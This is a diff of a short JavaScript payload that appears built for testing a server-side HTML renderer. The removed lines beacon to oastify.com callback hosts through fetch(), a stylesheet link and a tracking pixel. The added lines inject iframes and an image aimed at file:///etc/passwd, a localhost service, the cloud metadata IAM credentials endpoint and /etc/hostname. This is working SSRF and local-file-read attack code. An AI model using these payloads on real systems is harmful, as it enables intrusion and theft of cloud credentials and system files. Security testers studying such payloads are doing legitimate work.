@@ -1,20 +1,15 @@
-fetch("http://lshq47lharsppiz39l18lv5fd6jx7uvj.oastify.com")
 (function () {
-  var CSS = 'https://s.10z6cntxi705xy7jh19otbdvlmrdfc31.oastify.com/x.css';
-  var IMG = 'https://i.10z6cntxi705xy7jh19otbdvlmrdfc31.oastify.com/x.png';
-
-  var l = document.createElement('link');
-  l.rel = 'stylesheet';
-  l.type = 'text/css';
-  l.href = CSS;
-  (document.head || document.documentElement).appendChild(l);
-
-  var i = document.createElement('img');
-  i.src = IMG;
-  i.width = 1;
-  i.height = 1;
-  (document.body || document.documentElement).appendChild(i);
-
-  new Image().src = IMG + '?dup=1';
+  function make(tag, attrs) {
+    var e = document.createElement(tag);
+    for (var k in attrs) e.setAttribute(k, attrs[k]);
+    return e;
+  }
+  var payloads = [
+    { tag: 'iframe', attrs: { src: 'file:///etc/passwd', width: '800', height: '400' } },
+    { tag: 'iframe', attrs: { src: 'http://localhost:8080/', width: '800', height: '300' } },
+    { tag: 'iframe', attrs: { src: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', width: '800', height: '200' } },
+    { tag: 'img',    attrs: { src: 'file:///etc/hostname', width: '1', height: '1' } }
+  ];
+  var root = document.body || document.documentElement;
+  payloads.forEach(function (p) { root.appendChild(make(p.tag, p.attrs)); });
 })();
-   
